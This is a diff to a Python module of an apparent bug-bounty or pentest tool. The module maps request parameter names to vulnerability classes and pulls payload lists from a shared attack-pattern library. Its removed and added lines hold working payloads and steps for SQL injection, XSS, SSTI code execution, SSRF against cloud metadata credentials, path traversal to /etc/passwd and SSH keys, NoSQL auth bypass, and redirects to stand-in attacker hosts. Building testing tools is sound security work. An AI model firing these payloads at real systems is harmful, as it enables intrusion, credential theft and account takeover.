@@ -25,6 +25,35 @@ from dataclasses import dataclass, field
 from typing import Any, AsyncGenerator, Optional
 from urllib.parse import parse_qs, urlparse
 
+# ─── Attack Suite pattern library ────────────────────────────────────────────
+# Re-use the same 5700+ bug-bounty patterns the scanner uses so payloads,
+# parameter lists, and endpoint patterns stay in one place.
+from app.api.v1.attack_patterns import (
+    XSS_PAYLOADS, XSS_TEST_PARAMS, DOM_XSS_PAYLOADS, DOM_XSS_SINK_PARAMS,
+    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_TEST_PARAMS,
+    SSRF_PARAMS, SSRF_TARGETS, SSRF_BYPASS_ENCODINGS,
+    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS, IDOR_REST_PATHS,
+    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
+    SSTI_PAYLOADS, SSTI_TEST_FIELDS,
+    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS,
+    XXE_PAYLOADS,
+    FILE_UPLOAD_PATHS, FILE_UPLOAD_BYPASS_EXTENSIONS, FILE_UPLOAD_MALICIOUS_CONTENT,
+    INFO_DISCLOSURE_PATHS,
+    PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS,
+    MASS_ASSIGNMENT_ROLE_FIELDS,
+    ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS,
+    WEAK_CREDENTIAL_PAIRS,
+    JWT_WEAK_SECRETS, JWT_ALG_NONE_VARIANTS, JWT_KID_PAYLOADS,
+    CSRF_SENSITIVE_ACTIONS, CSRF_BYPASS_HEADERS,
+    PROTOTYPE_POLLUTION_PAYLOADS,
+    BUSINESS_LOGIC_TESTS, BUSINESS_LOGIC_BASKET_ATTACKS,
+    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_AUTH_BYPASS_QUERIES,
+    CACHE_POISON_HEADERS, CACHE_POISON_VALUES,
+    RACE_CONDITION_ENDPOINTS,
+    COMMON_SENSITIVE_PATHS,
+    TECH_SIGNATURES,
+)
+
 # ─── Limits ───────────────────────────────────────────────────────────────────
 
 MAX_FILE_BYTES = 500 * 1024 * 1024  # 500 MB
@@ -136,13 +165,19 @@ _EP_CLASSES: dict[str, dict] = {
 }
 
 # ─── Parameter → vulnerability mapping ───────────────────────────────────────
+# Payloads pulled directly from the attack_patterns library so both the live
+# scanner and the Burp analyser always use the same up-to-date dataset.
+
+def _ssrf_payload_list() -> list[str]:
+    """Flatten SSRF_TARGETS into a plain list of URL strings."""
+    return [t[0] for t in SSRF_TARGETS] + SSRF_BYPASS_ENCODINGS
+
+def _nosql_payload_list() -> list[str]:
+    return [str(p) for p in NOSQL_INJECTION_PAYLOADS] + NOSQL_URL_PAYLOADS
 
 _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
     (
-        frozenset(["id", "user_id", "userid", "account_id", "uid", "pid", "cid", "oid",
-                   "object_id", "record_id", "item_id", "doc_id", "post_id", "message_id",
-                   "order_id", "invoice_id", "customer_id", "profile_id", "report_id",
-                   "chat_id", "thread_id", "ticket_id", "task_id", "project_id"]),
+        frozenset(p.lower() for p in IDOR_ID_PARAMS),
         {
             "vuln": "idor",
             "severity": "high",
@@ -157,42 +192,31 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
                 "While authenticated as User A, replace {param} with User B's value",
                 "Verify whether User A can access / modify / delete User B's data",
                 "Repeat without any Authorization header to test unauthenticated access",
-                "Also try: /api/resource/{id}  where id is User B's — test BOLA at path level"
+                "Also test BOLA at path level: /api/resource/<user_b_id>",
             ],
         }
     ),
     (
-        frozenset(["search", "q", "query", "filter", "sort", "order", "keyword",
-                   "term", "find", "s", "k", "where", "having", "group_by",
-                   "order_by", "category", "tag", "type", "status"]),
+        frozenset(p.lower() for p in SQLI_TEST_PARAMS),
         {
             "vuln": "sqli",
             "severity": "critical",
             "title": "SQL Injection",
             "cwe": "CWE-89",
             "owasp": "A03:2021 - Injection",
-            "description": "Search, filter, and sort parameters that interact with a database are prime SQL injection targets. Even ordering parameters can be injectable.",
-            "payloads": [
-                "'", "''", "' OR '1'='1", "' OR 1=1--",
-                "') OR ('1'='1",  "' OR SLEEP(5)--",
-                "1; WAITFOR DELAY '0:0:5'--",
-                "1 UNION SELECT null,null,null--",
-                "' ORDER BY 1--", "' ORDER BY 100--",
-                "1' AND (SELECT 3113 FROM(SELECT(SLEEP(5)))a)--"
-            ],
+            "description": "Search, filter, sort, and ID parameters that interact with a database are prime SQL injection targets.",
+            "payloads": SQLI_ERROR_PAYLOADS + SQLI_TIME_PAYLOADS,
             "steps": [
-                "Send a single-quote (') in the {param} parameter — observe the response",
-                "Look for database errors: 'syntax error', 'ORA-', 'mysql_', 'SQLSTATE'",
-                "Try time-based blind: {param}=' OR SLEEP(5)-- (watch for 5s delay)",
-                "If injectable, automate with sqlmap: sqlmap -u '{url}' -p {param} --dbs",
-                "Also test POST body parameters and JSON keys with the same payloads"
+                "Send a single-quote (') in {param} — look for SQL errors in the response",
+                "Check for: 'syntax error', 'ORA-', 'mysql_', 'SQLSTATE'",
+                "Try time-based blind: ' OR SLEEP(5)-- (watch for ~5 s delay)",
+                "If injectable, automate: sqlmap -u '{url}' -p {param} --dbs",
+                "Also test JSON body keys and POST parameters with the same payloads",
             ],
         }
     ),
     (
-        frozenset(["redirect", "url", "return", "next", "goto", "continue", "target",
-                   "redirect_uri", "callback_url", "return_url", "success_url", "back",
-                   "destination", "forward", "location", "after_sign_in_path"]),
+        frozenset(p.lower() for p in REDIRECT_PARAMS),
         {
             "vuln": "open_redirect",
             "severity": "medium",
@@ -200,55 +224,33 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
             "cwe": "CWE-601",
             "owasp": "A01:2021 - Broken Access Control",
             "description": "URL redirection parameters can send users to attacker-controlled domains, enabling phishing and OAuth token theft.",
-            "payloads": [
-                "https://evil.com",
-                "//evil.com",
-                "/\\evil.com",
-                "https://evil.com%2F%40legit.com",
-                "https://legit.com.evil.com",
-                "javascript:alert(document.domain)",
-                "data:text/html,<script>alert(1)</script>"
-            ],
+            "payloads": REDIRECT_PAYLOADS,
             "steps": [
-                "Replace the {param} value with https://evil.com",
-                "Follow the redirect — verify the destination",
-                "Try bypass variants: //evil.com  /\\evil.com",
-                "For OAuth redirect_uri: append %2F%40evil.com or add extra path",
-                "Check whether redirect occurs before or after authentication"
+                "Replace {param} with https://evil.example.com",
+                "Follow the redirect — verify the browser lands on the attacker domain",
+                "Try bypass variants: //evil.example.com  /\\evil.example.com",
+                "For OAuth redirect_uri: append %2F%40evil.example.com",
+                "Check whether the redirect fires before or after authentication",
             ],
         }
     ),
     (
-        frozenset(["url", "callback", "endpoint", "host", "server", "api_url",
-                   "webhook", "fetch", "load", "href", "src", "dest", "uri",
-                   "proxy", "forward_to", "remote", "origin", "source", "link",
-                   "ping", "image_url", "avatar_url", "feed"]),
+        frozenset(p.lower() for p in SSRF_PARAMS),
         {
             "vuln": "ssrf",
             "severity": "high",
             "title": "Server-Side Request Forgery (SSRF)",
             "cwe": "CWE-918",
             "owasp": "A10:2021 - Server-Side Request Forgery",
-            "description": "Parameters that accept URLs may cause the server to make outbound requests, exposing cloud metadata, internal services, and enabling CSRF against internal APIs.",
-            "payloads": [
-                "http://169.254.169.254/latest/meta-data/",
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
-                "http://169.254.169.254/metadata/v1/",
-                "http://localhost:6379/",
-                "http://127.0.0.1:9200/",
-                "http://0.0.0.0/",
-                "http://[::1]/",
-                "file:///etc/passwd",
-                "dict://127.0.0.1:11211/stats"
-            ],
+            "description": "Parameters that accept URLs may cause the server to make outbound requests, exposing cloud metadata and internal services.",
+            "payloads": _ssrf_payload_list(),
             "steps": [
-                "Set up an out-of-band listener: Burp Collaborator or https://app.interactsh.com",
-                "Replace {param} with your listener URL — verify DNS/HTTP callback",
+                "Set up an OOB listener: Burp Collaborator or https://app.interactsh.com",
+                "Replace {param} with your listener URL — confirm DNS/HTTP callback",
                 "Try AWS metadata: http://169.254.169.254/latest/meta-data/",
                 "Try GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
                 "Try internal services: 127.0.0.1:6379 (Redis)  127.0.0.1:9200 (Elasticsearch)",
-                "Try bypass techniques: 0x7f000001 (hex), 0177.0.0.1 (octal), 2130706433 (decimal)"
+                "Try IP bypass encodings: 0177.0.0.1 (octal)  2130706433 (decimal)  0x7f000001 (hex)",
             ],
         }
     ),
@@ -262,7 +264,7 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
             "title": "Path Traversal / Local File Inclusion",
             "cwe": "CWE-22",
             "owasp": "A01:2021 - Broken Access Control",
-            "description": "File path parameters can be manipulated with directory traversal sequences to read files outside the intended directory — including /etc/passwd, application configs, and source code.",
+            "description": "File path parameters can be manipulated with directory traversal sequences to read arbitrary files from the server.",
             "payloads": [
                 "../../../../etc/passwd",
                 "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
@@ -270,53 +272,40 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
                 "%252e%252e%252fetc%252fpasswd",
                 "..\\..\\..\\..\\windows\\win.ini",
                 "/etc/passwd%00.jpg",
-                "/proc/self/environ"
+                "/proc/self/environ",
             ],
             "steps": [
                 "Replace {param} with ../../../../etc/passwd",
-                "Look for Unix passwd content: root:x:0:0:root",
+                "Look for: root:x:0:0:root in the response",
                 "Try URL-encoded variants to bypass filters",
                 "On Windows targets: ..\\..\\windows\\win.ini",
                 "Try double-encoding: ..%252f..%252fetc%252fpasswd",
-                "Also try: /proc/self/environ  /.ssh/id_rsa  /app/config.yml"
+                "Also probe: /proc/self/environ  /.ssh/id_rsa  /app/.env",
             ],
         }
     ),
     (
-        frozenset(["name", "title", "comment", "message", "description", "body",
-                   "content", "text", "bio", "about", "note", "subject", "post",
-                   "reply", "caption", "review", "feedback", "label", "tag",
-                   "username", "display_name", "full_name", "first_name", "last_name"]),
+        frozenset(p.lower() for p in (XSS_TEST_PARAMS + SSTI_TEST_FIELDS)),
         {
             "vuln": "xss",
             "severity": "medium",
             "title": "Cross-Site Scripting (XSS)",
             "cwe": "CWE-79",
             "owasp": "A03:2021 - Injection",
-            "description": "User-controlled text rendered in HTML without encoding allows script injection. Leads to session hijacking, credential theft, and DOM manipulation.",
-            "payloads": [
-                "<script>alert(1)</script>",
-                "<img src=x onerror=alert(document.domain)>",
-                "'\"><script>alert(1)</script>",
-                "<svg onload=alert(1)>",
-                "<iframe srcdoc='<script>alert(1)</script>'>",
-                "{{7*7}}",
-                "${7*7}",
-                "javascript:alert(1)"
-            ],
+            "description": "User-controlled text rendered in HTML without encoding allows script injection, enabling session hijacking and credential theft.",
+            "payloads": XSS_PAYLOADS[:12] + DOM_XSS_PAYLOADS[:4],
             "steps": [
                 "Submit <script>alert(1)</script> in the {param} field",
-                "Navigate to where this value is rendered for other users",
-                "If filtered, try: <img src=x onerror=alert(1)>",
-                "Check for stored (persists) vs reflected (URL-only) XSS",
-                "Test for DOM XSS: look for .innerHTML, document.write, eval() in JS source",
-                "Check if value appears in JSON responses used by client-side rendering"
+                "Navigate to where this value is displayed to other users",
+                "If filtered, try: <img src=x onerror=alert(document.domain)>",
+                "Check stored (persists across sessions) vs reflected (URL-only)",
+                "Test DOM XSS: look for .innerHTML / document.write / eval() in JS",
+                "Also check JSON responses consumed by client-side rendering frameworks",
             ],
         }
     ),
     (
-        frozenset(["template", "view", "render", "format", "style", "theme",
-                   "layout", "engine", "tpl", "tmpl", "skin"]),
+        frozenset(p.lower() for p in SSTI_TEST_FIELDS) | frozenset(["template", "view", "render", "format", "style", "theme", "layout", "engine", "tpl", "tmpl", "skin"]),
         {
             "vuln": "ssti",
             "severity": "high",
@@ -324,15 +313,14 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
             "cwe": "CWE-94",
             "owasp": "A03:2021 - Injection",
             "description": "Template engine parameters can execute server-side expressions, potentially leading to Remote Code Execution.",
-            "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
-                         "{{7*'7'}}", "@(7*7)", "${{7*7}}", "{{config}}"],
+            "payloads": SSTI_PAYLOADS,
             "steps": [
-                "Submit {{7*7}} in the {param} field — look for 49 in the response",
-                "If {{7*'7'}} returns 7777777, it's likely Jinja2",
+                "Submit {{7*7}} in {param} — look for 49 in the response (SSTI confirmed)",
+                "If {{7*'7'}} returns 7777777, it's Jinja2",
                 "Identify the engine from error messages",
                 "Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}}",
-                "FreeMarker RCE: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
-                "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+                "FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+                "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
             ],
         }
     ),
@@ -346,14 +334,14 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
             "cwe": "CWE-840",
             "owasp": "A04:2021 - Insecure Design",
             "description": "Financial parameters trusted from the client side can be set to negative, zero, or astronomically large values to manipulate transactions.",
-            "payloads": ["-1", "0", "0.001", "0.00", "-99.99", "9999999", "null", "1e99"],
+            "payloads": ["-1", "0", "0.001", "0.00", "-99.99", "9999999", "null", "1e99"]
+                        + [str(t.get("quantity", "")) for t in BUSINESS_LOGIC_BASKET_ATTACKS if "quantity" in t],
             "steps": [
-                "Set {param} to a negative value like -1 and complete the transaction",
-                "Check if the account balance/credit increases (negative → credit)",
+                "Set {param} to -1 and complete the transaction — check if balance increases",
                 "Try 0.00 to acquire items for free",
                 "Try extremely large values for integer overflow",
                 "Intercept the response and modify the server-returned price before confirmation",
-                "Remove {param} entirely — check if the server defaults to 0"
+                "Remove {param} entirely — verify the server doesn't default to 0",
             ],
         }
     ),
@@ -366,18 +354,32 @@ _PARAM_VULN_MAP: list[tuple[frozenset[str], dict]] = [
             "cwe": "CWE-640",
             "owasp": "A07:2021 - Identification and Authentication Failures",
             "description": "Email parameters in password reset or email-change flows may be manipulated to reroute tokens to attacker-controlled addresses.",
-            "payloads": [
-                "victim@example.com attacker@evil.com",
-                "victim@example.com\r\nattacker@evil.com",
-                "victim%40example.com",
-                "victim@example.com%00attacker@evil.com",
-            ],
+            "payloads": [t["description"] for t in ATO_PASSWORD_RESET_TESTS[:6]],
             "steps": [
-                "In the password-reset flow, submit the request with {param} targeting a victim email",
-                "Check if the reset link is sent to the attacker's email instead",
-                "Try HTTP Host header injection: change Host to attacker.com and initiate reset",
-                "Try parameter pollution: send {param} twice (once victim, once attacker)",
-                "Check the reset-link domain — does it use the Host header value?"
+                "In the password-reset flow, set {param} to target a victim email",
+                "Check if the reset link arrives at the attacker-controlled address",
+                "Try HTTP Host header injection: change Host to attacker.com then trigger reset",
+                "Try parameter pollution: send {param} twice (victim once, attacker once)",
+                "Check the reset-link domain — does it use the Host header value?",
+            ],
+        }
+    ),
+    (
+        frozenset(["q", "search", "find", "lookup", "filter"]),
+        {
+            "vuln": "nosql_injection",
+            "severity": "high",
+            "title": "NoSQL Injection",
+            "cwe": "CWE-943",
+            "owasp": "A03:2021 - Injection",
+            "description": "Search parameters in NoSQL-backed APIs may accept MongoDB operators ($gt, $ne, $regex) that bypass authentication or return all records.",
+            "payloads": _nosql_payload_list()[:10],
+            "steps": [
+                "Change {param}=value to {param}[$ne]=invalid — check if all records return",
+                "Try {param}[$gt]= (empty string) — matches all documents",
+                "Try {param}[$regex]=.* — wildcard match",
+                "For JSON bodies: replace value with {\"$gt\": \"\"}",
+                "Test login: set password[$ne]=invalid to bypass authentication",
             ],
         }
     ),
